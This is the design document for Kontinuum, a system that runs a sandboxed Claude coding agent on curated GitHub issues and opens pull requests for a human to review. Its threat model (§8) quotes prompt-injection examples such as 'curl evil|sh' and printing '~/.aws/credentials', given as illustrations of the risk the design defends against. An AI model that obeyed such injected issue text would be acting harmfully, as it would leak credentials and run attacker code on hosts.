# Kontinuum — MVP Design & Schema (v4, as-built)

> Companion to `kontinuum-spec.md` (the *vision*). This is the *minimum loop that works* — poll a
> curated GitHub issue, implement it with a real Claude agent inside a credential-free sandbox,
> verify with a local gate + the repo's CI, open a PR for a human. **This revision matches the
> code as it actually is** (`kontinuum/`), verified live end-to-end. Sections describe what's built;
> **§16 Later** and **§20 Build Order** hold what's next. Divergences from the original plan are
> called out where they matter.

**Design invariants (must always hold — everything else serves these):**
1. **At most one instance works any issue** (single-owner), even under crashes, races, and human label edits.
2. **Nothing ships without a human** — K opens PRs; it never merges or deploys.
3. **The agent's *commands* never run unsandboxed and never see host credentials** — untrusted input can't exfiltrate or destroy.
4. **A change is "done" only on objective evidence** — the gate + CI, never an LLM's say-so alone.
5. **Any component can die at any instant with no lost or duplicated work** — state is recoverable and effects are idempotent.

---

## 1. One-sentence framing

**Kontinuum is a persistent, plain-code orchestrator each developer runs; it continuously pulls
human-curated GitHub issues, claims one via an epoch-leased append-only claim log so no other
instance double-works it, runs a real Claude coding agent whose commands are confined to a
credential-free sandbox, verifies with a fast local gate plus the repo's existing CI, and opens a
pull request for a human to merge — 24/7, crash-recoverable.**

GitHub issues are the one canonical queue. The human owns backlog order and the merge button.

---

## 2. Decision Log (as-built)

| # | Decision | Choice | Why |
|---|----------|--------|-----|
| 1 | Agent runtime | **`claude` CLI driven headless** (subprocess), behind a duck-typed `AgentRunner` | The Python Agent SDK needs 3.10+; the machine runs 3.9. The CLI is already installed + logged in — no new dep, no key. |
| 2 | Agent containment | **Agent runs on the host; its *commands* run in the box via an MCP `run` tool** (option #2) | Login stays on the host (never in the box); only the risky part — running commands — is contained. Simpler + tighter than a proxy. |
| 3 | MVP scenario | **Existing-repo maintenance only** | Autonomy needs ground truth to verify against. |
| 4 | Work queue | **GitHub issues = single canonical queue + coordination substrate** | Solve claiming/dedup/audit/curation *once*. |
| 5 | Human gate | **Stops at open PR** | Worst case = an unmerged branch: reversible, zero prod impact. |
| 6 | State topology | **No local DB — GitHub is the only authority** | Each pass re-reads GitHub (claim log + labels); nothing local to corrupt or reconcile. (Doc's old `state.db` was deliberately dropped.) |
| 7 | Loop driver | **Long-running polling supervisor** | Simple, no inbound net. |
| 8 | Coordination | **Epoch-leased claim log (issue comments); labels are a projection** | Correct under reclaim, races, and human label edits. |
| 9 | Isolation | **Serial, one ephemeral sandbox per task** | No self-conflicts; strong isolation of untrusted execution. |
| 10 | Security | **No-network box + orchestrator-only writes + secret-scan** | An injected command has no network + no creds; the agent only proposes; a diff that adds a secret is blocked. |
| 11 | Verification | **Fast local gate (offline) + heavy e2e delegated to existing CI** | K needn't reproduce prod locally; CI already has the real env. |
| 12 | Deployment | **Per-developer workers, one agent required** | Execution fans out; single-owner keeps it safe. |
| 13 | Verification judge | **Objective gate + one independent Reviewer**, bounded feedback-retry | Coder can't grade its own homework; a fresh context catches what the gate can't. |

Deferred decisions (N-diverse reviewers, agent registry/router, trust tiers, producers, egress-allowlist proxy, drift detection) are in **§16 Later**.

---

## 3. Architecture Schema (as-built)

```
        ┌───────────────────────────────────────────────────────┐
        │   GitHub Issues  —  the single canonical work queue     │
        │   • epoch-leased CLAIM LOG (comments) = ownership truth  │
        │   • labels = human-facing projection (exclusive state)  │
        └───────────────────────────┬───────────────────────────┘
                     each developer's K polls & claims (epoch+lease)
        ┌────────────────────────────┼───────────────────────────┐
        ▼                            ▼                            ▼
  ┌──────────────────────────────────────────────────────────────────┐
  │  K instance  (per developer) — plain Python, no local DB          │
  │  Orchestrator loop: maintain PRs · poll · claim · execute · PR    │
  │  Privileged writes (git push / PR / comment / label) run HERE via │
  │  `gh`/`git`, after a secret-scan + owner/hold guard.              │
  │        │ builds a fresh git worktree off a cached clone           │
  │        ▼                                                          │
  │  🤖 Claude agent runs ON THE HOST (login / API key here):         │
  │     • edits files in the worktree (Read/Edit/Write)              │
  │     • runs commands ONLY via the `run` tool ─────────┐           │
  │                                                       ▼           │
  │  ┌──────────────────────────────────────────────┐   MCP server   │
  │  │  SANDBOX (ephemeral container per task)       │◄──docker exec──┘
  │  │  --network none · --cap-drop ALL · no host    │                 │
  │  │  env; the worktree is mounted at /work        │                 │
  │  └──────────────────────────────────────────────┘                 │
  │  Verification: local gate (offline, in the box) · e2e → existing CI│
  └──────────────────────────────────────────────────────────────────┘
      Ports (duck-typed): IssueQueue(GitHub) · AgentRunner(claude CLI) · Reviewer(claude CLI)
```

**The security split:**
- **The agent is a credential-free proposer.** It reads the repo and edits files; it can only *run* commands through the `run` tool, which `docker exec`s into a **no-network, no-secrets** container. Its output is a **diff** — data, not effects.
- **The orchestrator holds the credentials.** Every push / PR / comment / label runs in the orchestrator via `gh`/`git`, gated by a secret-scan and an owner/hold re-check. (There is no separate "Effect Broker" class — this *is* the effect boundary.)

---

## 4. Deployment Model — per-developer workers

Private, DB-less instances ⇒ **GitHub is the only shared state**, which is why both the queue and
the lock live there. Execution fans out across developers safely because claiming guarantees
single-owner (§7).

- **Per-dev workers:** safe via the claim log. `kontinuum run` **requires an agent** (`agent: claude`, or `demo` to dry-run the pipeline).
- **Identity:** `instance_id = kontinuum/<dev>@<host>`, stamped in every claim-log entry.
- **Auth:** the agent uses the machine's Claude Code login; set `ANTHROPIC_API_KEY` to run headless on a server.
- **Kill switch:** an open `kontinuum:paused` issue halts K on that repo; a global org kill = revoke the bot's token.

---

## 5. Component Responsibilities (as-built)

| Component | Kind | Responsibility |
|---|---|---|
| **Orchestrator** (`loop.py`) | code | The loop: maintain PRs → poll → claim → execute → open PR. Owns the heartbeat, bounded error-retry, worktree cleanup. Holds the credentials for all writes. |
| **Sandbox** (`sandbox.py`) | infra | Ephemeral container per task: worktree at `/work`, no host env, `--network none`, `--cap-drop ALL`. `run()` one-off (gate) + `start/exec/stop` persistent (agent commands). |
| **MCP `run` tool** (`sandbox_mcp.py`) | code | Tiny stdio MCP server exposing one tool that `docker exec`s a command into the task's box — the only way the agent runs commands. |
| **IssueQueue** (`github.py`) | port (GitHub) | List `ready`/`claimed`, read/append the claim log, set the exclusive state label, comment, open PR. Authoritative for ownership. |
| **AgentRunner** (`agent.py`) | port | `ClaudeAgentRunner`: drive `claude -p` on the host, tools = Read/Edit/Write + the sandbox `run` tool, Bash disabled. Returns the PR body; the diff comes from git. |
| **Reviewer** (`agent.py`) | port | `ClaudeReviewer`: independent read-only second opinion; must answer `APPROVE` explicitly. |
| **Pipeline** (`pipeline.py`) | code | `propose`: agent → gate → secret-scan → reviewer, feeding each failure back (≤3, oscillation + empty-diff guards) → a `Proposal` (diff + PR body). |
| **Effects** (`effects.py`) | code | `open_pr` (commit detached HEAD, force-push, `gh pr create`) + `scan_diff` (block secrets before push). |
| **Recipe** (`recipe.py`) | code | Load `<repo>/.kontinuum/verify.yaml` → `image`, `gate`, optional `setup`, `network`. |

---

## 6. The Single Work Queue — typing & qualification

Two kinds of intent stay separate: **standing spec** (product spec/constraints → `.kontinuum/`,
*not* an issue) vs **discrete work items** (everything actionable → issues).

- **Qualification gate:** confident+actionable → `kontinuum:ready`; uncertain → `kontinuum:needs-triage` (a human promotes). Only `ready` (and `claimed`, for recovery) is ever picked up.
- **Labels are an exclusive projection** of state: `set_label(X)` adds `kontinuum:X` and removes any other state label (`ready|claimed|pr-open|blocked|needs-triage`), so a worked issue leaves the poll set. `hold`/`paused` are separate human overrides.
- Work types (`type/implement`, `type/fix`) are a **future** routing signal — the current pipeline treats every issue the same (single gate command). Per-type proving-test evidence is **§16 Later**.

---

## 7. Distributed Claiming — epoch-leased claim log

**Ownership truth is the append-only claim log (issue comments), not labels.** Comments are
immutable and GitHub-serialized with monotonic IDs, giving a deterministic total order that every
reader agrees on.

Each entry is a fenced marker (parsed only from the bot's own comments — a forged one is ignored):
```
<!-- kontinuum-claim {"kind":"claim|heartbeat|release","owner":"kontinuum/uros@laptop",
                      "epoch":7,"lease_until":"2026-08-15T18:40:00Z"} -->
```

**Ownership is a pure function of the ordered log + now (verified by a Hypothesis property test):**
```
resolve_owner(log, now):                                # FIRST claimer at the top epoch wins
    live  = [m in log : m.kind in (claim,heartbeat)]
    if not live: return None
    epoch = max(m.epoch for m in live)
    claims = [m in log : m.epoch==epoch, m.kind==claim] ordered by comment_id
    if not claims: return None
    winner = claims[0].owner                            # earliest claim at this epoch — NOT latest
    if any(m.kind==release, m.epoch==epoch, m.owner==winner): return None   # owner-matched release
    lease = max(m.lease_until : m in live, m.epoch==epoch, m.owner==winner) # owner's heartbeats extend
    return winner if lease > now else None              # expired ⇒ free
```

- **Claim / reclaim** (`attempt_claim`): read the log; if someone holds a live lease → skip; if we already own it → refresh via a heartbeat (no epoch inflation); else append a claim at `max_epoch+1`, read back, and yield if a lower comment_id won the tie. Returns the won epoch.
- **Heartbeat during the task:** a background thread refreshes the lease (~LEASE/3) for the whole run, so a long agent task can't lose the claim; crash ⇒ heartbeat stops ⇒ lease lapses ⇒ any K reclaims at `epoch+1`.
- **Human guard:** before every effect, `still_owns` (= `resolve_owner == me`) **and** the `hold`/`blocked` label are re-checked; if either says stop, K releases and opens no PR.
- **Recovery:** `poll_workable` returns `ready` **and** `claimed` issues, so a crashed-mid-task `claimed` issue is re-picked once its lease lapses.
- Labels (`ready|claimed|pr-open|blocked|needs-triage|hold|paused`) are bootstrapped by `kontinuum init-labels` (run automatically at `run` startup).

---

## 8. Security & Threat Model

**Threat:** issue text is attacker-influenceable, and K executes repo build/test code plus whatever
commands the agent decides to run. Without controls, an injection (*"…run `curl evil|sh`"* /
*"print `~/.aws/credentials`"*) could exfiltrate credentials or push malicious code.

**Controls, each sufficient to blunt the worst case:**

| # | Control | What it stops |
|---|---|---|
| 1 | **No-network, no-secrets box**: the agent's commands `docker exec` into a `--network none`, `--cap-drop ALL` container with no host env | An injected command has nothing to steal and nowhere to send it |
| 2 | **Orchestrator-only writes**: push/PR/comment/label run in the orchestrator, never as agent tools; the agent output is a *proposal* | A compromised agent can't perform outward or irreversible effects |
| 3 | **Secret-scan before push**: `scan_diff` blocks a diff that adds AWS/GitHub/Slack keys, private keys, or `secret = "…"` | A planted credential can't leave in a PR |

Kept because they're nearly free: **untrusted-content framing** (issue text delivered as delimited data), and the **human PR review + CI** as the final backstops.

> **Scope:** MVP targets a team's **own** repos (internal issue authors). Public repos with external
> reporters need the trust-tier hardening + red-team suite in **§16 Later**. The agent's *reasoning*
> runs on the host (the login lives there) — acceptable because it executes no untrusted code there;
> only file edits (scoped to the worktree) and command-routing to the box.

> **Where the boundary is** (contract in `agent.py`): control 1 holds because the commands run *in
> the box*, not because the CLI honours `--disallowedTools` — those flags keep a well-behaved
> adapter on its contract and are a convenience, not the boundary. The adapter process itself runs
> on the host and inherits K's env (on a headless install, `ANTHROPIC_API_KEY`), so K trusts a
> registered adapter to keep the contract: run K with a host env holding no secrets beyond the
> agent's own credential. A less-trusted backend needs its own process boxed (§16 trust tiers) —
> that's a prerequisite for adopting one, not something today's flags already provide.

---

## 9. Verification Model

Declared per repo in `verify.yaml`. K runs a **fast local gate** in the sandbox and **delegates
heavy e2e to the repo's existing CI**.

| Stage | Runs | Where | Gates the PR? |
|---|---|---|---|
| **gate** (build/lint/test) | seconds–min | sandbox (`--network none`) | must pass before the PR opens |
| **e2e / full stack** | slow / needs real env | **existing CI on the pushed branch** | K reads CI status each pass, non-blocking |

- **Deps offline:** the box has no network, so the gate must run offline. An optional **`setup`** step runs *with* network *before* the isolated agent, installing deps into the worktree (kept out of the diff); or bake deps into `image`. (The old tiered L0–L3 model collapsed to one gate + CI.)
- **CI:** `reconcile_open_prs` reads each open PR's rollup: red CI **or** a human-closed-unmerged PR → the issue is marked `blocked`. Green → the human merges.
- **No per-type evidence** yet — the gate is a single command. A `fix`-must-prove-itself check is §16 Later.

---

## 10. Task Execution Pipeline (per issue)

```
claim_and_run:
  claim (epoch+lease); start a background HEARTBEAT for the whole task
  execute():
    if a PR already exists for this branch -> reuse it (idempotent); done
    guard: hold/blocked label or not owner -> release, bail
    worktree off the cached clone (fresh branch off default)
    [optional] setup step WITH network installs deps (kept out of the diff)
    ┌─ propose() — retry <=3, feedback accumulated ───────────────────┐
    │  agent (claude CLI): edit files; run commands via the box tool  │
    │  gate (offline, in the box)  ->  fail: feedback -> retry        │
    │  secret-scan the diff        ->  hit:  feedback -> retry        │
    │  reviewer (explicit APPROVE) ->  reject: feedback -> retry      │
    │  empty diff / repeated diff  ->  stop early (BLOCKED)           │
    └─────────────────────────────────────────────────────────────────┘
    guard again (hold/blocked/owner) before any effect
    open PR (commit detached HEAD, force-push, gh pr create)
      -> comment issue -> set pr-open
  later passes: reconcile_open_prs reads CI -> red/closed => blocked; green => human merges
```

- **Reviewer honesty:** two LLMs share blind spots — the reviewer is *one input*, not the trust anchor; the real anchors are the objective gate, CI, and human PR review. One reviewer in MVP; N-diverse is §16.
- **Convergence guards:** feedback accumulates; identical/short-cycle diffs stop early; an empty diff (agent did nothing / timed out) is rejected, never turned into a PR.
- **Idempotent + crash-safe:** an existing PR short-circuits; `open_pr` force-pushes a detached commit (no leaked local branch); a per-issue error releases and retries, blocking only after 3.

---

## 11. Work-item Lifecycle

```
  label (exclusive)     meaning
  ────────────────      ─────────────────────────────────────────
  ready              →  qualified & eligible (or claimed = recoverable)
  claimed            →  a K holds a live lease (or crashed; reclaimable once it lapses)
  pr-open            →  PR up; CI watched each pass
  blocked            →  retries/CI exhausted, PR closed-unmerged, or persistent error → human
  needs-triage       →  producer/human unsure → human promotes
  hold / paused      →  human override: stop working this issue / this repo
  (labels removed)   →  merged/closed by a human
```

| Failure | Detection | Recovery |
|---|---|---|
| Agent/K crash mid-task | heartbeat stops → lease lapses | issue stays `claimed`, re-polled + reclaimed at `epoch+1` |
| Gate/reviewer reject | gate exit / verdict | feedback → retry ≤3, oscillation → `blocked` |
| Secret in diff | `scan_diff` | feedback → retry; never pushed |
| Lost claim / human hold | `still_owns` + label re-check | abort before effects, release cleanly |
| Transient infra error (gh/git/docker) | exception | release + retry next pass; `blocked` after 3 |
| PR CI red / closed unmerged | `reconcile_open_prs` | `blocked` + comment |

---

## 12. Reliability & Recovery

- **Single ownership authority:** the GitHub claim log is the *only* source of truth; there is no local DB to reconcile. Every ownership decision re-reads the log (`still_owns`).
- **Idempotent effects:** before opening a PR, check for an existing PR on the branch and reuse it; `open_pr` force-pushes a detached commit so a re-run never collides on a leaked local branch.
- **Crash recovery is free:** K holds no durable state; on restart it re-polls, and the lease mechanism hands orphaned `claimed` issues to whoever's alive.
- **Daemon resilience:** each issue is wrapped (error → release, `blocked` after 3) and each repo pass is wrapped, so one failure never takes down the loop.
- **Cleanup:** worktrees are removed after each task; the shared exclude file is snapshotted/restored so setup deps never leak between issues. (Long-run claim-log/branch compaction is the **Janitor**, §16.)

---

## 13. State & Data

**There is no `state.db`.** GitHub is the authority; K derives everything it needs each pass:
- ownership + lease → the issue's claim-log comments;
- work state → the issue's exclusive `kontinuum:*` label;
- CI status → the PR's check rollup.

The only local state is a **cached clone per repo** under `~/.kontinuum/cache/<owner>__<repo>` (fetched, not re-cloned) and an in-memory per-issue error counter in the running daemon. Persisted history/metrics/budget tables are **§16 Later**.

---

## 14. Configuration & Recipe Schemas (as-built)

`~/.kontinuum/config.yaml` (per machine — NOT in a repo; lists all repos this K watches):
```yaml
instance_id: kontinuum/uros@laptop
bot_login:   uros                 # only this author's claim markers are trusted
agent:       claude               # or: demo   (required for `run`)
assignee:    uros                 # optional — personal queue; omit for the shared queue
repos:
  - trco/kontinuum
  - trco/other-project
lease_min:   60
poll_sec:    300
```

`<repo>/.kontinuum/verify.yaml` (per repo, human-confirmed at onboarding — the trust anchor):
```yaml
image: python:3.11-slim              # sandbox image with the toolchain
gate:  python -m pytest -q           # runs OFFLINE in the box; must pass to open a PR
setup: pip install --target /work/.deps -r requirements.txt   # optional, runs WITH network first
network: none                        # optional; 'bridge' only if the agent itself needs the net
```

CLI: `kontinuum run` · `onboard --repo X` (agent proposes a `verify.yaml` via a PR) · `status` · `init-labels --repo X`.

---

## 15. Repo & Process Layout

```
~/.kontinuum/
  config.yaml                       # per-machine run config (agent, repos, ...)
  cache/<owner>__<repo>/            # one cached clone per repo; per-task git worktrees off it

<target-repo>/.kontinuum/
  verify.yaml                       # per-repo trust anchor (image + gate [+ setup/network])
  # CURRENT_STATE.md etc. — generated docs are a future onboarding output

GitHub Issues                       # shared queue + claim log + audit + curation
Existing CI                         # runs e2e on K's PRs (K reads status)
```

---

## 16. Roadmap — v1 next, then deferred

### 16.1 · v1 — being built now

The next build turns Kontinuum from the bare loop into a **context-aware, planning** worker: it learns
each repo (living docs), plans before it codes, and loads the right skills. Five pieces,
dependency-ordered; each comes online only after merge + `git pull` + daemon restart, so K gets more
capable as it builds itself.

| # | Piece | Decision | Built by | Dep |
|---|---|---|---|---|
| 1 | **Agent contract** | Formalize the `AgentRunner`/`Reviewer` contract + `agent:` selector; Claude stays the reference. **Containment is enforced by K's boundary (sandbox + no host creds), not by trusting an agent CLI's tool flags.** A 2nd backend is on-demand. | dogfood | — |
| 2 | **Universal-plugin injection** | K bundles repo-agnostic plugins and injects them into the worktree `.claude/` at runtime, **excluded from the commit** (same trick as the deps-exclude). Repo-native `.claude/` is auto-loaded and used as-is. | hand-build | — |
| 3 | **Living docs** | Reuse the databox living-docs plugin. Three roles: **seed** (`onboard`), **update** (a same-PR pipeline step via `docs-update`), **consume** (agent context). Doc diffs ride in the **same PR** as the code; content lives per-repo in `docs/living-docs/`; treated as context-to-verify, never ground truth. | hand-build | 2 |
| 4 | **Per-issue planner** | Before coding, the agent — judging whether the issue warrants it — writes a plan to `docs/plans/<date>-<slug>.md`, grounded in living docs, then follows it. Default autonomous-until-PR (plan ships in the same PR); `kontinuum:plan-first` forces a plan-approval checkpoint first. | dogfood | 3 |
| 5 | **Config surface** | Per-repo config gains an `agent:` selector + which **universal plugins** are on (default: all). Repo-native `.claude/` needs no declaration. | dogfood | 2 |

Issues stay human-authored; a signal→issue helper, if ever wanted, is an *interactive* skill, not a K feature.

### 16.2 · Still deferred — designed, not discarded

Each item is a real feature cut from the first loop. Build it when its trigger fires; not before.

| Deferred | What it adds | Add when |
|---|---|---|
| **Egress-allowlist proxy** | box reaches only package registries (vs the offline `setup` step) | a repo's tests genuinely need network mid-run |
| **Per-type evidence** (`fix` must ship a test that fails-before/passes-after) | objective proof a fix works, not the agent's word | you want stronger "done" than the plain gate |
| **N-diverse reviewers** (correctness/security/requirements lenses) | multiple perspective-diverse reviewers | high-risk paths (security/payment/auth) or `trust:external` work |
| **Agent Registry + Router** (matcher + priority; custom agents) | `(role,task)→agent`, custom runners override defaults | a **2nd runner** exists — the *contract* + `agent:` selector is v1 (§16.1); the registry/router itself stays deferred |
| **Trust tiers** (`internal|external`) + **hardened profile** + **red-team suite** | stricter egress + human-promote + N-diverse review for untrusted issues | before pointing K at a repo with external/anonymous reporters |
| **`type/investigate` + SignalReader** (read-only Sentry/ES/Grafana) | root-cause tasks that read production signals | the core loop is reliable and signal-driven work is wanted |
| **Producers** (Asana/Sentry/ES/Grafana → issues) + `ingest.db` | automated signal→issue creation, idempotent via own store | after the core loop holds; the issue-queue seam already supports them |
| **Spec-diff planner (spec → issues)** | reads a multi-file in-repo spec + Current State, files & sequences child issues, re-diffs as the spec evolves. Ownership is two-level: planning once (epic-claim or fingerprint-dedup); execution fans out per child issue | you want whole-project / multi-file specs, not only discrete issues |
| **Solo spec lock (whole-spec ownership)** | one developer's K owns an entire multi-file spec end-to-end; lock shared on GitHub so other machines stay out. Two modes from one lock: split (per-issue) vs solo (whole spec) | a developer wants to work a whole spec alone |
| **Janitor** + **claim-log compaction** | GC worktrees/branches, prune the growing claim/heartbeat comment log | disk/comment growth actually bites over a long run |
| **History/metrics tables + budget caps** | queryable past + tokens/PRs-per-day money guard | you need to query history or cap spend |
| **PR rebase-on-base-drift** | auto-rebase + re-verify a `pr-open` PR when its base moves | conflicts on stale PRs become common |
| **Merge/deploy autonomy, post-deploy verification, parallel execution, web dashboard** | beyond "stop at PR" | explicitly out of the MVP thesis; separate decision |

---

## 17. Testing Kontinuum Itself

- **Property tests on claiming** (`test_claim.py`, Hypothesis): randomized interleavings assert **single-owner** — this is how the first-claimer-wins tie-break was found and fixed.
- **Protocol/loop tests** (`test_protocol.py`, `test_loop.py`): claim/skip/reclaim, heartbeat, guards, `poll_once` (bail → move on, block only after repeated errors).
- **Docker-gated tests** (`test_sandbox.py`, `test_pipeline.py`): sandbox isolation (no host env, no egress, worktree writes) and the pipeline end-to-end with a fake agent.
- **Marker/CI/config/recipe unit tests**.
- Verified live end-to-end (real Claude agent → real PR) and a **two-issue soak** (the queue advances). **Deferred:** a `kill -9` chaos suite and a multi-instance soak (§16 / validation).

---

## 18. Success Metrics / SLOs

| Dimension | Target for "MVP works" |
|---|---|
| **Safety** | 0 double-claims across ≥2 instances over a soak; 0 unauthorized merges/deploys |
| **Recovery** | `kill -9` at any point → 0 lost or duplicated work |
| **Correctness** | ≥50% of `ready` issues reach a human-merged PR with no changes requested |
| **Cost** | median cost/issue tracked and within budget (budget caps are §16) |
| **Throughput** | ≥ N mergeable PRs/day/instance |

---

## 19. MVP Scope — IN vs OUT

**IN (built):** existing-repo onboarding (proposed `verify.yaml` via PR); GitHub-issue queue;
epoch-leased claim log + heartbeat + human guard; **no-network sandbox + orchestrator-only writes +
secret-scan**; offline local gate (+ optional `setup`) + CI-delegated e2e; agent (claude CLI, option
#2) → gate → secret-scan → independent reviewer → PR, with feedback-retry; idempotent PR + crash
recovery via GitHub-authoritative ownership + bounded error-retry; `run`/`onboard`/`status`/`init-labels`
CLI; `paused` kill-switch; per-machine multi-repo config + personal (assignee) queues; property/soak
test harness.

**OUT (see §16):** egress-allowlist proxy; per-type evidence; N-diverse reviewers; agent
registry/router; trust tiers + red-team; `investigate` + SignalReader; producers + `ingest.db`;
spec-diff planner + solo spec lock; Janitor + claim-log compaction; history/metrics + budget caps;
PR rebase-on-drift; merge/deploy autonomy; parallel execution; web dashboard.

---

## 20. Build Order — status

- [x] **0 · Stage-0 spike** — verify.yaml gate stood up; CI-for-e2e confirmed.
- [x] **1 · Skeleton loop + sim harness** — poll/claim loop; Hypothesis property scaffolding. *(state.db intentionally dropped.)*
- [x] **2 · Claim log + human guard** — epoch-lease + heartbeat + `still_owns`/`hold`; single-owner property-tested. *(2-instance week-long soak: not run.)*
- [x] **3 · Sandbox + effect boundary** — credential-free `--network none` box; writes orchestrator-side; secret-scan. *(egress-allowlist proxy → §16.)*
- [x] **4 · Onboarding** — `kontinuum onboard` proposes a `verify.yaml` via PR. *(CURRENT_STATE/Surveyor → §16.)*
- [x] **5 · Happy-path pipeline** — agent → gate → PR → CI, proven live.
- [x] **6 · Reviewer + retries + oscillation + BLOCKED**.
- [x] **7 · PR maintenance + crash recovery + idempotency + bounded error-retry**; `status` CLI. *(rebase-on-drift + metrics/budget → §16.)*

**Real remainders before "leave it running on many untrusted repos":** the validation runs (kill-9 chaos, multi-instance soak), then §16 items as their triggers fire (egress proxy, per-type evidence, trust tiers/red-team, claim-log compaction).

---

## 21. Open Questions (deferred defaults, override anytime)

- **Sandbox runtime:** Docker locally vs a shared runner? *(Default: Docker per instance.)*
- **Budget unit:** tokens vs $ vs PRs/day? *(Default when built: tokens/day + PRs/day, per instance.)*
- **Onboarding depth:** one `CURRENT_STATE.md` vs a split doc set? *(Default: start with `verify.yaml` only.)*
